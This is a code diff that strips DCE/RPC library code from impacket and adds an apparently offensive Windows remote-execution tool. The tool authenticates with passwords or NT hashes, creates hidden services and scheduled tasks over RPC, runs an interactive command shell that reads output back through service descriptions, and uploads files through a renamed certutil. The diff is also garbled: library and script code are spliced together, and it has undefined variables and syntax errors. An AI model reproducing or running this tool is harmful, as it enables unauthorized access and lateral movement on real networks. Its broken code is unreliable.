+        encodeString = convertTuple(re.findall(r"<textarea name=\"output\" id=\"output\" placeholder=\"Result goes here...\" spellcheck=\"false\" style=\"height:220px;\">(.*?)</textarea>", response.text)[0])
+        # print("encode result:")
+        # print(encodeString.strip())
+        return encodeString.strip()
+def ip_validation(ip):
+        import socket
 
         try:
-            if data['uuid'] != b'':
-                data['flags'] |= PFC_OBJECT_UUID
-        except:
-            # Structure doesn't have uuid
-            pass
-        data['ctx_id'] = self._ctx
-        data['call_id'] = self.__callid
-        data['alloc_hint'] = len(data['pduData'])
-        # We should fragment PDUs if:
-        # 1) Payload exceeds __max_xmit_size received during BIND response
-        # 2) We'e explicitly fragmenting packets with lower values
-        should_fragment = False
+                socket.inet_aton(ip)
+                # legal
+        except socket.error:
+                return False
+        return True
+# Not legal
 
-        # Let's decide what will drive fragmentation for this request
-        if self._max_user_frag > 0:
-            # User set a frag size, let's compare it with the max transmit size agreed when binding the interface
-            fragment_size = min(self._max_user_frag, self.__max_xmit_size)
+def convertTuple(tup):
+        # initialize an empty string
+        str = ''
+        for item in tup:
+                str = str + item
+        return str
+def usage():
+        print("python sc.py domain/username password|hash targetip targetFQDN")
+if not (len(sys.argv) == 4 or len(sys.argv) == 5 or len(sys.argv) == 6 or len(sys.argv) == 7):
+        usage()
+        exit()
+
+
+argv = sys.argv
+
+
+
+nthash=''
+targetFQDN='argv[4]'
+username=argv[1].split('/')[1]
+password=argv[2]
+if len(password.split(':',1))==2:
+        if len(password.split(':',1)[1])==32:
+                nthash=argv[2]
+                if len(nthash)>0:
+                        nthash=nthash.split(':',1)[1]
+                        nthash=a2b_hex(nthash)
+                        password=''
+domain=argv[1].split('/')[0]
+targetip=argv[3]
+print(f"[*] using domain: {domain}")
+print(f"[*] using user: {username}")
+if len(password)>0:
+        print(f"[*] using password: {password}")
+else:
+        if len(nthash)%2!=0:
+                print(f"[-] nthash {nthash} malformat")
+                usage()
+                exit()
+        print(f"[*] using nthash: {nthash}")
+if not ip_validation(targetip):
+        print(f"[-] target ip {targetip} malformat")
+        usage()
+        exit()
+print(f"[*] using target: {targetip}")
+
+targetFQDN=generate_random_string(8)
+my_codec='GBK'
+if len(sys.argv)==5:
+        packet_delay = 1234
+        my_codec=argv[4]
+        print(f"[*] set packet send delay: {packet_delay}")
+kdc_host=''
+if len(sys.argv)==7:
+        my_codec=argv[4]
+        targetFQDN=argv[5]
+        kdc_host=argv[6]
+if len(sys.argv)==6:
+        targetFQDN=argv[4]
+        kdc_host=argv[5]
+# 参数处理完成--------------------------------------------------------------------
+
+
+# 发送map request，获取RPC监听的端口
+scmr_binding_string = hept_map(targetip,uuidtup_to_bin(('367ABB81-9844-35F1-AD32-98F038001003','2.0')),protocol='ncacn_ip_tcp')
+
+tsch_binding_string = hept_map(targetip,uuidtup_to_bin(('86D35949-83C9-4044-B424-DB363231FD0C','1.0')),protocol='ncacn_ip_tcp')
+
+print(f"[+] get svcctl binding string: {scmr_binding_string}")
+print(f"[+] get tschsvc binding string: {tsch_binding_string}")
+
+scmrrpc = DCERPCTransportFactory(scmr_binding_string)
+scmrrpc.set_credentials(username=username,password=password,domain=domain,nthash=nthash)
+scmrrpc.setRemoteHost(targetip)
+scmrrpc.setRemoteName(targetFQDN)
+
+tschrpc = DCERPCTransportFactory(tsch_binding_string)
+tschrpc.set_credentials(username=username,password=password,domain=domain,nthash=nthash)
+tschrpc.setRemoteHost(targetip)
+tschrpc.setRemoteName(targetFQDN)
+
+if kdc_host!='':
+        scmrrpc.set_kerberos(True, kdc_host)
+        tschrpc.set_kerberos(True, kdc_host)
+
+try:
+        svcctl=scmrrpc.get_dce_rpc()
+
+        svcctl.set_credentials(*scmrrpc.get_credentials())
+        if kdc_host!='':
+                svcctl.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
         else:
-            fragment_size = self.__max_xmit_size
+                svcctl.set_auth_type(RPC_C_AUTHN_WINNT)
 
-        # Sanity check. Fragmentation can't be too low, otherwise sec_trailer won't fit
+        svcctl.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+        svcctl.connect()
+        svcctl.bind(scmr.MSRPC_UUID_SCMR)
 
-        if self.__auth_level in [RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY]:
-            if fragment_size <= 8:
-                # Minimum pdu fragment size is 8, important when doing PKT_INTEGRITY/PRIVACY. We need a minimum size of 8
-                # (Kerberos)
-                fragment_size = 8
 
-        # ToDo: Better calculate the size needed. Now I'm setting a number that surely is enough for Kerberos and NTLM
-        # ToDo: trailers, both for INTEGRITY and PRIVACY. This means we're not truly honoring the user's frag request.
-        if len(data['pduData']) + 128 > fragment_size:
-            should_fragment = True
-            if fragment_size+128 > self.__max_xmit_size:
-                fragment_size = self.__max_xmit_size - 128
-
-        if should_fragment:
-            packet = data['pduData']
-            offset = 0
-
-            while 1:
-                toSend = packet[offset:offset+fragment_size]
-                if not toSend:
-                    break
-                if offset == 0:
-                    data['flags'] |= PFC_FIRST_FRAG
-                else:
-                    data['flags'] &= (~PFC_FIRST_FRAG)
-                offset += len(toSend)
-                if offset >= len(packet):
-                    data['flags'] |= PFC_LAST_FRAG
-                else:
-                    data['flags'] &= (~PFC_LAST_FRAG)
-                data['pduData'] = toSend
-                self._transport_send(data, forceWriteAndx = 1, forceRecv =data['flags'] & PFC_LAST_FRAG)
+        print("[+] successfully connected to SCMR RPC")
+        tschctl=tschrpc.get_dce_rpc()
+        tschctl.set_credentials(*tschrpc.get_credentials())
+        if kdc_host!='':
+                tschctl.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
         else:
-            self._transport_send(data)
-        self.__callid += 1
+                tschctl.set_auth_type(RPC_C_AUTHN_WINNT)
+        tschctl.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+        tschctl.connect()
+        tschctl.bind(tsch.MSRPC_UUID_TSCHS)
+        print("[+] successfully connected to TSCH RPC")
+        # 调用RPC
+        # 创建服务，用于填写描述信息
+        # 首先需要打开服务管理器
+        scManagerHandle = hROpenSCManagerW(svcctl,lpMachineName='')['lpScHandle']
 
-    def recv(self):
-        finished = False
-        forceRecv = 0
-        retAnswer = b''
-        while not finished:
-            # At least give me the MSRPCRespHeader, especially important for 
-            # TCP/UDP Transports
-            response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
-            response_header = MSRPCRespHeader(response_data)
-            # Ok, there might be situation, especially with large packets, that 
-            # the transport layer didn't send us the full packet's contents
-            # So we gotta check we received it all
-            while len(response_data) < response_header['frag_len']:
-               response_data += self._transport.recv(forceRecv, count=(response_header['frag_len']-len(response_data)))
+        #
+        lpServiceName = generate_random_string(5)
+        hService = hRCreateServiceW(svcctl,scManagerHandle,lpServiceName,lpServiceName,dwStartType=SERVICE_DEMAND_START,lpBinaryPathName='C:\\1.txt')['lpServiceHandle']
+        print(f"[+] service {lpServiceName} created successfully")
 
-            off = response_header.get_header_size()
+        # 创建一个计划任务
+        schtasks_name=generate_random_string(5)
+        print(f"[+] schedule task {schtasks_name} created successfully")
 
-            if response_header['type'] == MSRPC_FAULT and response_header['frag_len'] >= off+4:
-                status_code = unpack("<L",response_data[off:off+4])[0]
-                if status_code in rpc_status_codes:
-                    raise DCERPCException(rpc_status_codes[status_code])
-                elif status_code & 0xffff in rpc_status_codes:
-                    raise DCERPCException(rpc_status_codes[status_code & 0xffff])
-                else:
-                    if status_code in hresult_errors.ERROR_MESSAGES:
-                        error_msg_short = hresult_errors.ERROR_MESSAGES[status_code][0]
-                        error_msg_verbose = hresult_errors.ERROR_MESSAGES[status_code][1] 
-                        raise DCERPCException('%s - %s' % (error_msg_short, error_msg_verbose))
-                    else:
-                        raise DCERPCException('Unknown DCE RPC fault status code: %.8x' % status_code)
+        # 更改计划任务的配置其实还是调用wrap_hSchRpcRegisterTask，并没有单独的RPC调用，从schtasks抓的包也是这样的
+        # 先将计划任务的xml文件拷贝到另一个地方
+        xml_file_name = generate_random_string(5)
+        print('copied_xml_file_name: '+xml_file_name)
+        wrap_hSchRpcRegisterTask(tschctl,
+                                 command='whatever',
+                                 schtasks_name=schtasks_name)
+        # 创建一个计划任务用于进行文件上传
+        schtasks_name_for_upload=generate_random_string(5)
+        print(f"[+] schedule task for file upload {schtasks_name_for_upload} created successfully")
 
-            if response_header['flags'] & PFC_LAST_FRAG:
-                # No need to reassembly DCERPC
-                finished = True
-            else:
-                # Forcing Read Recv, we need more packets!
-                forceRecv = 1
+        # 更改计划任务的配置其实还是调用wrap_hSchRpcRegisterTask，并没有单独的RPC调用，从schtasks抓的包也是这样的
+        # 先将计划任务的xml文件拷贝到另一个地方
+        xml_file_name = generate_random_string(5)
+        print('copied_xml_file_name: '+xml_file_name)
+        wrap_hSchRpcRegisterTask(tschctl,
+                                 command='whatever',
+                                 schtasks_name=schtasks_name_for_upload)
+        # wrap_hSchRpcRegisterTask(tschctl,command='copy C:\\windows\\system32\\tasks\\'+schtasks_name+" C:\\users\\public\\" +xml_file_name,schtasks_name=schtasks_name)
+        # tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+        # # 睡眠一秒，等待命令完成
+        # time.sleep(1)
 
-            answer = response_data[off:]
-            auth_len = response_header['auth_len']
-            if auth_len:
-                auth_len += 8
-                auth_data = answer[-auth_len:]
-                sec_trailer = SEC_TRAILER(data = auth_data)
-                answer = answer[:-auth_len]
 
-                if sec_trailer['auth_level'] == RPC_C_AUTHN_LEVEL_PKT_PRIVACY:
-                    if self.__auth_type == RPC_C_AUTHN_WINNT:
-                        if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
-                            # TODO: FIX THIS, it's not calculating the signature well
-                            # Since I'm not testing it we don't care... yet
-                            answer, signature =  ntlm.SEAL(self.__flags, 
-                                    self.__serverSigningKey, 
-                                    self.__serverSealingKey,  
-                                    answer, 
-                                    answer, 
-                                    self.__sequence, 
-                                    self.__serverSealingHandle)
-                        else:
-                            answer, signature = ntlm.SEAL(self.__flags, 
-                                    self.__serverSigningKey, 
-                                    self.__serverSealingKey, 
-                                    answer, 
-                                    answer, 
-                                    self.__sequence, 
-                                    self.__serverSealingHandle)
-                            self.__sequence += 1
-                    elif self.__auth_type == RPC_C_AUTHN_NETLOGON:
-                        from impacket.dcerpc.v5 import nrpc
-                        answer, cfounder = nrpc.UNSEAL(answer, 
-                               auth_data[len(sec_trailer):],
-                               self.__sessionKey, 
-                               False)
-                        self.__sequence += 1
-                    elif self.__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                        if self.__sequence > 0:
-                            answer, cfounder = self.__gss.GSS_Unwrap(self.__sessionKey, answer, self.__sequence,
-                                                                     direction='init', authData=auth_data)
 
-                elif sec_trailer['auth_level'] == RPC_C_AUTHN_LEVEL_PKT_INTEGRITY:
-                    if self.__auth_type == RPC_C_AUTHN_WINNT:
-                        ntlmssp = auth_data[12:]
-                        if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
-                            signature =  ntlm.SIGN(self.__flags, 
-                                    self.__serverSigningKey, 
-                                    answer, 
-                                    self.__sequence, 
-                                    self.__serverSealingHandle)
-                        else:
-                            signature = ntlm.SIGN(self.__flags, 
-                                    self.__serverSigningKey, 
-                                    ntlmssp, 
-                                    self.__sequence, 
-                                    self.__serverSealingHandle)
-                            # Yes.. NTLM2 doesn't increment sequence when receiving
-                            # the packet :P
-                            self.__sequence += 1
-                    elif self.__auth_type == RPC_C_AUTHN_NETLOGON:
-                        from impacket.dcerpc.v5 import nrpc
-                        ntlmssp = auth_data[12:]
-                        signature = nrpc.SIGN(ntlmssp, 
-                               self.__confounder, 
-                               self.__sequence, 
-                               self.__sessionKey, 
-                               False)
-                        self.__sequence += 1
-                    elif self.__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                        # Do NOT increment the sequence number when Signing Kerberos
-                        #self.__sequence += 1
-                        pass
-
-                
-                if sec_trailer['auth_pad_len']:
-                    answer = answer[:-sec_trailer['auth_pad_len']]
-              
-            retAnswer += answer
-        return retAnswer
-
-    def alter_ctx(self, newUID, bogus_binds = 0):
-        answer = self.__class__(self._transport)
-
-        answer.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
-                               self.__aesKey, self.__TGT, self.__TGS)
-        answer.set_auth_type(self.__auth_type)
-        answer.set_auth_level(self.__auth_level)
-
-        answer.set_ctx_id(self._ctx+1)
-        answer.__callid = self.__callid
-        answer.bind(newUID, alter = 1, bogus_binds = bogus_binds, transfer_syntax = bin_to_uuidtup(self.transfer_syntax))
-        return answer
-
-class DCERPC_RawCall(MSRPCRequestHeader):
-    def __init__(self, op_num, data = b'', uuid=None):
-        MSRPCRequestHeader.__init__(self)
-        self['op_num'] = op_num
-        self['pduData'] = data
-        if uuid is not None:
-            self['flags'] |= PFC_OBJECT_UUID
-            self['uuid'] = uuid
-
-    def setData(self, data):
-        self['pduData'] = data
-
-# 2.2.6 Type Serialization Version 1
-class CommonHeader(NDRSTRUCT):
-    structure = (
-        ('Version', UCHAR),
-        ('Endianness', UCHAR),
-        ('CommonHeaderLength', USHORT),
-        ('Filler', ULONG),
-    )
-    def __init__(self, data = None,isNDR64 = False):
-        NDRSTRUCT.__init__(self, data, isNDR64)
-        if data is None:
-            self['Version'] = 1
-            self['Endianness'] = 0x10
-            self['CommonHeaderLength'] = 8
-            self['Filler'] = 0xcccccccc
-
-class PrivateHeader(NDRSTRUCT):
-    structure = (
-        ('ObjectBufferLength', ULONG),
-        ('Filler', ULONG),
-    )
-    def __init__(self, data = None,isNDR64 = False):
-        NDRSTRUCT.__init__(self, data, isNDR64)
-        if data is None:
-            self['Filler'] = 0xcccccccc
-
-class TypeSerialization1(NDRSTRUCT):
-    commonHdr = (
-        ('CommonHeader', CommonHeader),
-        ('PrivateHeader', PrivateHeader),
-    )
-    def getData(self, soFar = 0):
-        self['PrivateHeader']['ObjectBufferLength'] = len(NDRSTRUCT.getData(self, soFar)) + len(
-            NDRSTRUCT.getDataReferents(self, soFar)) - len(self['CommonHeader']) - len(self['PrivateHeader'])
-        return NDRSTRUCT.getData(self, soFar)
-
-class DCERPCServer(Thread):
-    """
-    A minimalistic DCERPC Server, mainly used by the smbserver, for now. Might be useful
-    for other purposes in the future, but we should do it way stronger.
-    If you want to implement a DCE Interface Server, use this class as the base class
-    """
-    def __init__(self):
-        Thread.__init__(self)
-        self._listenPort    = 0
-        self._listenAddress = '127.0.0.1'
-        self._listenUUIDS   = {}
-        self._boundUUID     = b''
-        self._sock          = None
-        self._clientSock    = None
-        self._callid        = 1
-        self._max_frag       = None
-        self._max_xmit_size = 4280
-        self.__log = LOG
-        self._sock = socket.socket()
-        self._sock.bind((self._listenAddress,self._listenPort))
-
-    def log(self, msg, level=logging.INFO):
-        self.__log.log(level,msg)
-
-    def addCallbacks(self, ifaceUUID, secondaryAddr, callbacks):
+        # 然后需要写入处理结果文件到xml文件并将xml设置到计划任务中的bat脚本
+        # 截断xml文件的最后两行，并生成中间文件<Description>和封口文件 </Description></RegistrationInfo></Task>
+        # 下面这个是原始脚本
         """
-        adds a call back to a UUID/opnum call
-        
-        :param uuid ifaceUUID: the interface UUID
-        :param string secondaryAddr: the secondary address to answer as part of the bind request (e.g. \\\\PIPE\\\\srvsvc)
-        :param dict callbacks: the callbacks for each opnum. Format is [opnum] = callback
+    @echo off &&setlocal EnableDelayedExpansion&&chdir C:\\users\\public&& set "cmd=findstr /R/N "^^" xml.xml | find /C ":"" && for /f %%a in ('!cmd!') do set number=%%a
+    set /a linenumber=%number%-1 && set destfile=file_part_1_file && set inputfile=xml.xml
+    set count=0 && for /f "delims=" %%a in (%inputfile%) do (
+    set /a count+=1 && if !linenumber! LEQ !count! (set /a random=1) else (echo %%a >> !destfile!))
+    echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInfo^>^</Task^>>description_tail
         """
-        self._listenUUIDS[uuidtup_to_bin(ifaceUUID)] = {}
-        self._listenUUIDS[uuidtup_to_bin(ifaceUUID)]['SecondaryAddr'] = secondaryAddr
-        self._listenUUIDS[uuidtup_to_bin(ifaceUUID)]['CallBacks'] = callbacks
-        self.log("Callback added for UUID %s V:%s" % ifaceUUID)
+        # 卡巴会保护system32目录，导致bat中的for循环出现错误，无法正常写入文件，因此我们需要切换目录到C:\users\public\downloads
+        # 好像并不是这个原因，
 
-    def setListenPort(self, portNum):
-        self._listenPort = portNum
-        self._sock = socket.socket()
-        self._sock.bind((self._listenAddress,self._listenPort))
+        # 写入bat脚本
+        service_desc_marker = generate_random_string(5)
+        file_part_1_name=generate_random_string(5)
+        bat_file_name=generate_random_string(5)
+        print("service_desc_marker: "+service_desc_marker)
+        print("bat_file_name: "+bat_file_name)
+        print("file_part_1_name: "+file_part_1_name)
 
-    def getListenPort(self):
-        return self._sock.getsockname()[1]
+        desc_tail_file_name = generate_random_string(5)
+        desc_header_file_name = generate_random_string(5)
+        print("desc_header_file_name: "+desc_header_file_name)
+        print("desc_tail_file_name: "+desc_tail_file_name)
+        split_out_dir_on_target=''
+        bat_finish_mark = write_bat(svcctl=svcctl, hService=hService, schtasks_name=schtasks_name, service_name=lpServiceName, service_desc_marker=service_desc_marker,
+                                    file_part_1_name=file_part_1_name, bat_file_name=bat_file_name, copied_xml_name=xml_file_name,
+                                    desc_tail_file_name=desc_tail_file_name, desc_header_file_name=desc_header_file_name )
+        print("bat_finish_mark: " + bat_finish_mark)
+        print(f"bat file write with name {bat_file_name} succeed")
 
-    def recv(self):
-        finished = False
-        retAnswer = b''
-        response_data = b''
-        while not finished:
-            # At least give me the MSRPCRespHeader, especially important for TCP/UDP Transports
-            response_data = self._clientSock.recv(MSRPCRespHeader._SIZE)
-            # No data?, connection might have closed
-            if response_data == b'':
-                return None
-            response_header = MSRPCRespHeader(response_data)
-            # Ok, there might be situation, especially with large packets, 
-            # that the transport layer didn't send us the full packet's contents
-            # So we gotta check we received it all
-            while len(response_data) < response_header['frag_len']:
-               response_data += self._clientSock.recv(response_header['frag_len']-len(response_data))
-            response_header = MSRPCRespHeader(response_data)
-            if response_header['flags'] & PFC_LAST_FRAG:
-                # No need to reassembly DCERPC
-                finished = True
-            answer = response_header['pduData']
-            auth_len = response_header['auth_len']
-            if auth_len:
-                auth_len += 8
-                auth_data = answer[-auth_len:]
-                sec_trailer = SEC_TRAILER(data = auth_data)
-                answer = answer[:-auth_len]
-                if sec_trailer['auth_pad_len']:
-                    answer = answer[:-sec_trailer['auth_pad_len']]
-              
-            retAnswer += answer
-        return response_data
-    
-    def run(self):
-        self._sock.listen(10)
+        # 执行上面的bat脚本，将xml进行拆分
+        wrap_hSchRpcRegisterTask(tschctl, command=bat_file_name + '.bat', schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
         while True:
-            self._clientSock, address = self._sock.accept()
-            try:
-                while True:
-                    data = self.recv()
-                    if data is None:
-                        # No data.. connection closed
+                time.sleep(1)
+                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
+                if motherfucker == '':
+                        continue
+                if len(motherfucker.split(bat_finish_mark, 1)) >= 2:
+                        # print("cmd execution finished, trying to get echo back...")
                         break
-                    answer = self.processRequest(data)
-                    if answer is not None:
-                        self.send(answer)
-            except Exception:
-                #import traceback
-                #traceback.print_exc()
-                pass
-            self._clientSock.close()
 
-    def send(self, data):
-        max_frag       = self._max_frag
-        if len(data['pduData']) > self._max_xmit_size - 32:
-            max_frag   = self._max_xmit_size - 32    # XXX: 32 is a safe margin for auth data
+                # print("waiting for cmd execution finish...")
 
-        if self._max_frag:
-            max_frag   = min(max_frag, self._max_frag)
-        if max_frag and len(data['pduData']) > 0:
-            packet     = data['pduData']
-            offset     = 0
-            while 1:
-                toSend = packet[offset:offset+max_frag]
-                if not toSend:
-                    break
-                flags  = 0
-                if offset == 0:
-                    flags |= PFC_FIRST_FRAG
-                offset += len(toSend)
-                if offset == len(packet):
-                    flags |= PFC_LAST_FRAG
-                data['flags']   = flags
-                data['pduData'] = toSend
-                self._clientSock.send(data.get_packet())
-        else:
-            self._clientSock.send(data.get_packet())
-        self._callid += 1
 
-    def bind(self,packet, bind):
-        # Standard NDR Representation
-        NDRSyntax   = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
-        resp = MSRPCBindAck()
+        new_xml_file = generate_random_string(5)
+        print("new_xml_file: " + new_xml_file)
+        cmd_result_file_name = generate_random_string(5)
+        print("cmd_result_file_name: "+cmd_result_file_name)
+        sch_backup_filename=generate_random_string(5)
+        fake_certutil_name=generate_random_string(5)
+        download_fake_certutil_name=generate_random_string(5)
+        ps_file_name=generate_random_string(5)
+        # 现在可以开始执行命令了
+        print("proudly brought to you by 12138 [https://144.one]")
+        while True:
+                there_is_no_need_to_get_echo_back=False
+                #time.sleep(packet_delay)
+                finish_mark=generate_random_string(5)
+                your_cmd = input('cmd>\n')
+                if your_cmd.strip().__len__()==0:
+                        continue
+                if your_cmd=='q':
+                        break
+                command = ''
+                if your_cmd.split(">",1).__len__()>=2:
+                        there_is_no_need_to_get_echo_back = True
+                        command = f'{your_cmd} && sc description {lpServiceName} "{service_desc_marker + finish_mark + service_desc_marker}"'
+                # 文件传输功能，开撸
+                elif your_cmd.split('up',1).__len__()>=2 and your_cmd.split('up', 1)[0]=='' and our_cmd.split('up', 1)[1][0]=='$'::
+                        # 文件上传
+                        # 首先对文件进行base64编码
+                        if len(your_cmd.split('$'))!=3:
+                                print("malformed, please retype: up$src_path$dest_path")
+                                continue
+                        src_path=your_cmd.split('$',1)[1].split('$',1)[0]
+                        dest_path=your_cmd.split('$',1)[1].split('$',1)[1]
+                        if len(src_path.strip())==0:
+                                print("malformed, please retype: up$src_path$dest_path")
+                                continue
+                        if len(dest_path.strip())==0:
+                                print("malformed, please retype: up$src_path$dest_path")
+                                continue
 
-        resp['type']             = MSRPC_BINDACK
-        resp['flags']            = packet['flags']
-        resp['frag_len']         = 0
-        resp['auth_len']         = 0
-        resp['auth_data']        = b''
-        resp['call_id']          = packet['call_id'] 
-        resp['max_tfrag']        = bind['max_tfrag']
-        resp['max_rfrag']        = bind['max_rfrag']
-        resp['assoc_group']      = 0x1234
-        resp['ctx_num']          = 0
+                        if not os.path.exists(src_path):
+                                print('file does not exist')
+                                continue
+                        if not is_path_exists_or_creatable(dest_path):
+                                print('dest path malformed')
+                                continue
 
-        data      = bind['ctx_items']
-        ctx_items = b''
-        resp['SecondaryAddrLen'] = 0
-        for i in range(bind['ctx_num']):
-            result = MSRPC_CONT_RESULT_USER_REJECT
-            item   = CtxItem(data)
-            data   = data[len(item):]
+                        # 首先给certutil挪个地方改个名
+                        fake_certutil_name = generate_random_string(5)
+                        print(f"fake_certutil_name is {fake_certutil_name}")
+                        #certutil_is_already_faked=True
+                        finish_mark = generate_random_string(5)
+                        # 同时还要创建一个输出目录，用于切分文件
+                        split_out_dir_on_target = generate_random_string(5)
+                        print('split_out_dir_on_target: ' + split_out_dir_on_target)
+                        command = f"copy certutil.exe {fake_certutil_name}.exe&&md {split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
 
-            # First we check the Transfer Syntax is NDR32, what we support
-            if item['TransferSyntax'] == uuidtup_to_bin(NDRSyntax):
-                # Now Check if the interface is what we listen
-                reason = 1 # Default, Abstract Syntax not supported
-                for j in self._listenUUIDS:
-                    if item['AbstractSyntax'] == j:
-                        # Match, we accept the bind request
-                        resp['SecondaryAddr']    = self._listenUUIDS[item['AbstractSyntax']]['SecondaryAddr']
-                        resp['SecondaryAddrLen'] = len(resp['SecondaryAddr'])+1
-                        reason           = 0
-                        self._boundUUID = j
-            else:
-                # Fail the bind request for this context
-                reason = 2 # Transfer Syntax not supported
-            if reason == 0:
-               result = MSRPC_CONT_RESULT_ACCEPT
-            if reason == 1:
-                LOG.error('Bind request for an unsupported interface %s' % bin_to_uuidtup(item['AbstractSyntax']))
+                        # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
+                        wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
 
-            resp['ctx_num']             += 1
-            itemResult                   = CtxItemResult()
-            itemResult['Result']         = result
-            itemResult['Reason']         = reason
-            itemResult['TransferSyntax'] = uuidtup_to_bin(NDRSyntax)
-            ctx_items                   += itemResult.getData()
+                        while True:
+                                time.sleep(1)
+                                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
+                                if motherfucker == '':
+                                        continue
+                                if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                                        print("cmd execution finished, trying to get echo back...")
+                                        break
 
-        resp['Pad']              ='A'*((4-((resp["SecondaryAddrLen"]+MSRPCBindAck._SIZE) % 4))%4)
-        resp['ctx_items'] = ctx_items
-        resp['frag_len']  = len(resp.getData())
 
-        self._clientSock.send(resp.getData())
-        return None
 
-    def processRequest(self,data):
-        packet = MSRPCHeader(data)
-        if packet['type'] == MSRPC_BIND:
-            bind   = MSRPCBind(packet['pduData'])
-            self.bind(packet, bind)
-            packet = None
-        elif packet['type'] == MSRPC_REQUEST:
-            request          = MSRPCRequestHeader(data)
-            response         = MSRPCRespHeader(data)
-            response['type'] = MSRPC_RESPONSE
-            # Serve the opnum requested, if not, fails
-            if request['op_num'] in self._listenUUIDS[self._boundUUID]['CallBacks']:
-                # Call the function 
-                returnData          = self._listenUUIDS[self._boundUUID]['CallBacks'][request['op_num']](request['pduData'])
-                response['pduData'] = returnData
-            else:
-                LOG.error('Unsupported DCERPC opnum %d called for interface %s' % (request['op_num'], bin_to_uuidtup(self._boundUUID)))
-                response['type']    = MSRPC_FAULT
-                response['pduData'] = pack('<L',0x000006E4)
-            response['frag_len'] = len(response)
-            return response
-        else:
-            # Defaults to a fault
-            packet         = MSRPCRespHeader(data)
-            packet['type'] = MSRPC_FAULT
+                        # 需要另外创建一个计划任务，因为执行命令的时候当前计划任务的描述信息会被覆盖
+                        # 其实也不用，加一个命令把这个计划任务复制出来就行了
+                        # 需要考虑对文件进行分包上传
+                        if os.path.exists('.'+os.path.sep+'split'):
+                                shutil.rmtree('.'+os.path.sep+'split')
+                        time.sleep(1)
+                        os.mkdir('.'+os.path.sep+'split')
+                        split_out_dir = '.'+os.path.sep+'split'
+                        i = 0
+                        with open(src_path, "rb") as in_file:
+                                # 每次读取1MB
+                                bytes = in_file.read(1024 * 1024)  # read 5000 bytes
+                                while bytes:
+                                        s = str(i)
+                                        padding = '0'
+                                        len = 3
 
-        return packet
+                                        x = s.rjust(len, padding)
+                                        with open(split_out_dir+os.path.sep+"out-file-" + x, 'wb') as output:
+                                                output.write(bytes)
+                                        bytes = in_file.read(1024 * 1024)  # read another 5000 bytes
+                                        i += 1
+                        file_counter_my=0
+                        print(f'split to {i} 1MB files')
+                        for filename in os.listdir(split_out_dir):
+                                s = str(file_counter_my)
+                                padding = '0'
+                                len = 3
+
+                                x = s.rjust(len, padding)
+                                file_counter_my=file_counter_my+1
+                                f = os.path.join(split_out_dir, filename)
+                                # checking if it is a file
+                                with open(f, "rb") as binaryFile:
+                                        encoded_string = base64.b64encode(binaryFile.read())
+                                encoded_string = encoded_string.decode('utf-8')
+
+                                sch_backup_filename=generate_random_string(5)
+                                print("sch tasks backup file: "+sch_backup_filename)
+                                finish_mark=generate_random_string(5)
+
+
+
+
+                                wrap_upload_hSchRpcRegisterTask(tschctl, encoded_string = encoded_string, sch_backup_filename=sch_backup_filename,lpServiceName=lpServiceName,service_desc_marker=service_desc_marker,finish_mark=finish_mark,schtasks_name = schtasks_name_for_upload, action=tsch.TASK_UPDATE)
+                                # 可以另外创建一个计划任务，以避免多执行一次copy命令，上传文件的时候就用这个计划任务
+
+                                #print(1)
+                                # 现在的问题是，传上去之后，如何把base64编码的那一行给提取出来
+                                # 现在的想法是利用现有的bat脚本进行修改，将原来的bat脚本更改为传参的脚本
+                                """
+                                @echo off &&setlocal EnableDelayedExpansion&&copy tasks\\atppf %1&& set /a linenumber=45+%4 && set destfile=%2 && set inputfile=%1
+                    set count=0 && for /f "tokens=* delims=" %%a in ('type "%inputfile%"') do (
+                    set /a count+=1 && if !linenumber! LEQ !count! (set /a random=1) else (echo %%a >> !destfile!&&echo %%a >%3))
+                    echo ^<Description^>>yfgas&&echo ^</Description^>^</RegistrationInfo^>^</Task^>>ylxbw&& sc description yqyor oqzpjvlgtsoqzpj
+                    
+                    
+                    
+                    kebhe 作为第一个参数
+                    bjiuf 作为第三个参数
+                    另外我们需要在写入的时候追加一个覆盖写  &&echo %%a >%3
+                    
+                    
+                    对于命令执行，第三个参数是没有用的
+                    对于文件上传来说，第二个参数是没有用的
+                    
+                    所以针对不同的情况生成对应的垃圾随机文件名就行了，最后清理的时候删除就行了
+                    
+                    好像是写不进去，因为太长了，cmd hold不住
+                    
+                    我他妈真是个天才，只需要在两头加上certuitl的标志字符串就行了
+                    -----BEGIN CERTIFICATE-----
+                    -----END CERTIFICATE-----
+                                """
+                                # 这是一个阻塞调用，所以返回后，就说明传完了
+                                # 解码
+                                print(f"decoding file to {dest_path}")
+                                finish_mark=generate_random_string(5)
+                                command = f"{fake_certutil_name}.exe -f -decode tasks\\{schtasks_name_for_upload} {split_out_dir_on_target}\\{x}.txt&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+
+                                # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
